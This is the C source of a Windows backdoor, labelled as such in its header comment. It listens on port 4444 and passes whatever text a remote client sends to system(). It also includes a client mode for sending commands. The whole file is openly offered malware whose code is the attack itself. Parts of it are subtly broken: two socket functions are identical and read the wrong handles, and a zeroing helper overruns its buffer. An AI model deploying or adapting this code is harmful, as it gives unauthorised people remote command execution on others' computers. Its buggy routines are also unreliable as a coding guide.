/*
 ****************************************************************
 * A simple backdoor for Windoze...                             *
 ****************************************************************
 */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <windows.h>
#include <winsock2.h>

#define MY_PORT 4444
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "[LINE:%d] [FILE:%s] : ERROR: %s\n", __LINE__, __FILE__, M);\
		else if(A == 1) fprintf(stderr, "[LINE:%d] [FILE:%s] : WARNING: %s\n", __LINE__, __FILE__, M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void
pzero(p, s)
char *p;
size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

#define MAXBUF 1024

void
writesocket(socket)
int *socket;
{
	DWORD dwRead, dwWritten;
	char buf[BUFSIZ];
	BOOL bSuccess = FALSE;
	HANDLE hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hStdError = GetStdHandle(STD_ERROR_HANDLE);

    for(;;) {
    	bSuccess = ReadFile(hStdOutput, buf, BUFSIZ, &dwRead, NULL);
    	if(!bSuccess || dwRead == 0) break;

    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
    	if(!bSuccess) break;

    	bSuccess = ReadFile(hStdError, buf, BUFSIZ, &dwRead, NULL);
    	if(!bSuccess || dwRead == 0) break;

    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
    	if(!bSuccess) break;
    }
}

void
readsocket(socket)
int *socket;
{
	DWORD dwRead, dwWritten;
	char buf[BUFSIZ];
	BOOL bSuccess = FALSE;
	HANDLE hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hStdError = GetStdHandle(STD_ERROR_HANDLE);

    for(;;) {
    	bSuccess = ReadFile(hStdOutput, buf, BUFSIZ, &dwRead, NULL);
    	if(!bSuccess || dwRead == 0) break;

    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
    	if(!bSuccess) break;

    	bSuccess = ReadFile(hStdError, buf, BUFSIZ, &dwRead, NULL);
    	if(!bSuccess || dwRead == 0) break;

    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
    	if(!bSuccess) break;
    }
}

struct _tagCLIENT {
	struct sockaddr_in client;
	int clientfd;
} clients;

DWORD
std_thread(lpVoid)
LPVOID lpVoid;
{
	char message[256];
	char buf[MAXBUF];
	int bytes;
	pzero(message, sizeof(message));
	sprintf(message, "%s:%u client connected.", inet_ntoa(clients.client.sin_addr),
		clients.client.sin_port);
	puts(message);

	do {
		if(send(clients.clientfd, "CMD >> ", 8, 0) < 0)
			puts("Error: sending data.");
		bytes=recv(clients.clientfd, buf, MAXBUF, 0);
		if(strncmp(buf, "", 1) != 0) system(buf);
		else send(clients.clientfd, "Error: no command entered.", strlen("Error: no command entered."), 0);
	} while(bytes > 0);

	if(closesocket(clients.clientfd)==0) {
		pzero(message, sizeof(message));
		sprintf(message, "%s:%u client disconnected.", inet_ntoa(clients.client.sin_addr),
			clients.client.sin_port);
		puts(message);
	}

	return S_OK;
}

int
main(argc, argv)
int argc;
char **argv;
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;

	sockfd = 0;
	WSAStartup(MAKEWORD(2, 0), &wsaData);

	if(argc < 2) {
		HANDLE hThread = NULL;
	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

		/* Setup socket address struct */
		pzero(&clients, sizeof(clients));
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = INADDR_ANY;

		/* bind port to socket */
		TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
		/* listen for connections */
		TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));

		for(;;) {
			int clientfd;
			struct sockaddr_in client;
			int clientlen = sizeof(client);

			/* accept connection */
			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
			if(clientfd>0) {
				clients.client = client;
				clients.clientfd = clientfd;
				hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&std_thread, NULL, 0, NULL);
			}
		}

		while(WaitForSingleObject(hThread, 0) != 0);
		closesocket(sockfd);
	} else if(argc == 2) {
		char buf[MAXBUF];
		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = inet_addr(argv[1]);

        TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));

        while(1) {
        	char reply[MAXBUF];
        	pzero(buf, sizeof(buf)/sizeof(char));
        	pzero(reply, sizeof(reply)/sizeof(char));

        	readsocket(&sockfd);
        	fflush(stdin);
        	if((recv(sockfd, reply, MAXBUF, 0)) < 0)
        		puts("Could not recv data.");
        	scanf("%[^\n]s", buf);
        	if(strncmp(buf, "exit", 4)==0) break;
			if((send(sockfd, buf, MAXBUF, 0)) < 0)
				puts("Could not send data.");
        }
        closesocket(sockfd);
	} else {
		fprintf(stderr, "Usage: Backdoor.exe [Address]\n");
	}

	WSACleanup();
	return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
